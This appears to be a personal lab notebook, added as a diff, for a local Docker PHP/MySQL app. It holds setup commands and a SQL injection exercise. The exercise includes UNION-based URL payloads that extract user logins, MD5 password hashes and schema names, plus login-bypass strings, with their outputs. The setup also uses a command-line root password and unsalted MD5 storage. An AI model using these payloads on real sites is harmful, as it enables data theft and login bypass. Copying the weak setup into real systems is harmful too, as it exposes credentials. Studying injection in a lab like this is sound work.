@@ -1,0 +1,233 @@
+docker-compose up
+docker-compose up -d
+docker-compose stop web && docker-compose rm -vf web && docker-compose up -d && docker-compose logs -f
+docker-compose down
+docker cp site.conf  $(docker-compose ps -q web):/www_site
+docker cp login.php  $(docker-compose ps -q web):/www_site
+docker exec -i -t  $(docker-compose ps -q mysql)  /bin/bash
+
+
+http://localhost:8080/index.php
+http://localhost:8080/testdb.php
+
+
+docker exec -i -t  $(docker-compose ps -q mysql)  /bin/bash
+mysql -u root -prootpassword -e "SHOW DATABASES"
+Warning: Using a password on the command line interface can be insecure.
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+
+mysql -u root -prootpassword 
+mysql -u root -prootpassword -
+>
+CREATE DATABASE dbmccoy;
+USE dbmccoy;
+mysql -u root -prootpassword -e "CREATE TABLE users (id INT NOT NULL AUTO_INCREMENT, login VARCHAR(45) NULL, passwd VARCHAR(35) NULL, PRIMARY KEY (id))"
+
+
+CREATE TABLE users (
+  id INT NOT NULL AUTO_INCREMENT,
+  login VARCHAR(45) NULL,
+  passwd VARCHAR(45) NULL,
+  PRIMARY KEY (id));
+  
+CREATE TABLE 'users' ('id' INT NOT NULL AUTO_INCREMENT, 'login' VARCHAR(45) NULL, 'passwd' VARCHAR(35) NULL, PRIMARY KEY ('id'));
+  
+  
+insert into users (login,passwd) values ('admin',md5('lambay'));
+insert into users (login,passwd) values ('john',md5('doe'));
+
+ mysql -u root -prootpassword
+Warning: Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 13
+Server version: 5.6.40 MySQL Community Server (GPL)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> CREATE DATABASE dbmccoy;
+Query OK, 1 row affected (0.02 sec)
+
+mysql> USE dbmccoy;
+Database changed
+mysql> CREATE TABLE users (id INT NOT NULL AUTO_INCREMENT, login VARCHAR(45) NULL, passwd VARCHAR(35) NULL, PRIMARY KEY (id))
+    -> ;
+Query OK, 0 rows affected (0.42 sec)
+
+mysql> insert into users (login,passwd) values ('admin',md5('lambay'));
+Query OK, 1 row affected (0.04 sec)
+
+mysql> insert into users (login,passwd) values ('john',md5('doe'));
+Query OK, 1 row affected (0.04 sec)
+
+mysql>
+mysql>
+mysql>
+mysql> select * from users;
++----+-------+----------------------------------+
+| id | login | passwd                           |
++----+-------+----------------------------------+
+|  1 | admin | 200ecd2e1bbb83a964c465df1004587b |
+|  2 | john  | 2829fc16ad8ca5a79da932f910afad1c |
++----+-------+----------------------------------+
+2 rows in set (0.01 sec)
+
+mysql>
+
+
+
+// user : 105 OR 1=1 --
+// passwd : xxx
+
+
+
+CREATE TABLE messages (id INT NOT NULL AUTO_INCREMENT, idmsg VARCHAR(45) NULL, msg VARCHAR(2000) NULL, PRIMARY KEY (id));
+insert into messages (idmsg,msg) values ('673489', 'contenu lambda');
+insert into messages (idmsg,msg) values ('892345', 'contenu lambda 2');
+
+
+http://localhost:8080/getmsg.php?idmsg=673489
+// Get message [SELECT msg FROM messages WHERE idmsg= 673489]msg= contenu lambda
+
+http://localhost:8080/getmsg.php?idmsg=673489%20%20UNION%20select%20login%20from%20users
+// Get message [SELECT msg FROM messages WHERE idmsg= 673489 UNION select login from users]msg= contenu lambda
+msg= admin
+msg= john
+
+
+http://localhost:8080/getmsg.php?idmsg=673489%20%20UNION%20select%20passwd%20from%20users
+// Get message [SELECT msg FROM messages WHERE idmsg= 673489 UNION select passwd from users]msg= contenu lambda
+msg= 200ecd2e1bbb83a964c465df1004587b
+msg= 2829fc16ad8ca5a79da932f910afad1c
+
+http://localhost:8080/getmsg.php?idmsg=673489%20%20UNION%20SELECT%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES
+
+
+ SELECT table_schema, table_name FROM INFORMATION_SCHEMA.tables ORDER BY table_schema, table_name;
++--------------------+----------------------------------------------------+
+| table_schema       | table_name                                         |
++--------------------+----------------------------------------------------+
+| dbmccoy            | messages                                           |
+| dbmccoy            | users                                              |
+| information_schema | CHARACTER_SETS                                     |
+| information_schema | COLLATIONS                                         |
+| information_schema | COLLATION_CHARACTER_SET_APPLICABILITY              |
+| performance_schema | events_waits_history_long                          |
+| performance_schema | events_waits_summary_by_account_by_event_name      |
+| performance_schema | events_waits_summary_by_host_by_event_name         |
+| performance_schema | events_waits_summary_by_instance                   |
+| performance_schema | events_waits_summary_by_thread_by_event_name       |
+| performance_schema | events_waits_summary_by_user_by_event_name         |
+| performance_schema | events_waits_summary_global_by_event_name          |
+| performance_schema | file_instances                                     |
+| performance_schema | file_summary_by_event_name                         |
+| performance_schema | file_summary_by_instance                           |
+| performance_schema | hosts                                              |
+| performance_schema | host_cache                                         |
+| performance_schema | mutex_instances                                    |
+| performance_schema | objects_summary_global_by_type                     |
+| performance_schema | performance_timers                                 |
+
+
+
+http://localhost:8080/getmsg.php?idmsg=673489%20%20UNION%20SELECT%20concat%20(table_schema,%20%22-%22,table_name)%20%20from%20INFORMATION_SCHEMA.TABLES
+
+// Get message [SELECT msg FROM messages WHERE idmsg= 673489 UNION SELECT concat (table_schema, "-",table_name) from INFORMATION_SCHEMA.TABLES]msg= contenu lambda
+msg= information_schema-CHARACTER_SETS
+msg= information_schema-COLLATIONS
+msg= information_schema-COLLATION_CHARACTER_SET_APPLICABILITY
+msg= information_schema-COLUMNS
+msg= information_schema-COLUMN_PRIVILEGES
+msg= information_schema-INNODB_SYS_TABLES
+msg= information_schema-INNODB_BUFFER_POOL_STATS
+msg= information_schema-INNODB_FT_CONFIG
+msg= dbmccoy-messages
+msg= dbmccoy-users
+msg= mysql-columns_priv
+msg= mysql-db
+msg= mysql-event
+msg= mysql-func
+msg= mysql-general_log
+
+
+SELECT column_name from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbmccoy' AND TABLE_NAME='users';
++-------------+
+| column_name |
++-------------+
+| id          |
+| login       |
+| passwd      |
++-------------+
+3 rows in set (0.01 sec)
+
+
+============================================
+
+Bypassing MD5 Hash Check Example (MSP)
+Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+Password : 1234
+81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
+
+
+Finding Database Structure in MySQL (M)
+Getting User defined Tables
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'
+Getting Column Names
+SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'
+
+product.asp?id=4 OR 1=1 
+
+
+
+
+
+==============================
+ docker-compose exec mysql mysql -u root -prootpassword -e "SHOW DATABASES"
+Warning: Using a password on the command line interface can be insecure.
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+
+========================================
+==> Creer base, tables et qq entrées
+==
+# docker-compose exec mysql mysql -u root -prootpassword -e "CREATE DATABASE dbmccoy;"
+# docker-compose exec mysql mysql -u root -prootpassword -e "USE dbmccoy;CREATE TABLE users (id INT NOT NULL AUTO_INCREMENT, login VARCHAR(45) NULL, passwd VARCHAR(35) NULL, PRIMARY KEY (id))"
+w# docker-compose exec mysql mysql -u root -prootpassword -e "USE dbmccoy;insert into users (login,passwd) values ('admin',md5('lambay'));"
+# docker-compose exec mysql mysql -u root -prootpassword -e "USE dbmccoy;insert into users (login,passwd) values ('john',md5('doe'));"
+
+
+#docker-compose exec mysql mysql -u root -prootpassword -e "USE dbmccoy; CREATE TABLE messages (id INT NOT NULL AUTO_INCREMENT, idmsg VARCHAR(45) NULL, msg VARCHAR(2000) NULL, PRIMARY KEY (id));"
+docker-compose exec mysql mysql -u root -prootpassword -e "USE dbmccoy; insert into messages (idmsg,msg) values ('673489', 'contenu lambda'); insert into messages (idmsg,msg) values ('892345', 'contenu lambda 2');"
+
+
+
+==> requete
+#docker-compose exec mysql mysql -u root -prootpassword -e "USE dbmccoy;SELECT * FROM users WHERE login='john';"
+Warning: Using a password on the command line interface can be insecure.
++----+-------+----------------------------------+
+| id | login | passwd                           |
++----+-------+----------------------------------+
+|  2 | john  | 2829fc16ad8ca5a79da932f910afad1c |
++----+-------+----------------------------------+
+
+
+
+
+
+
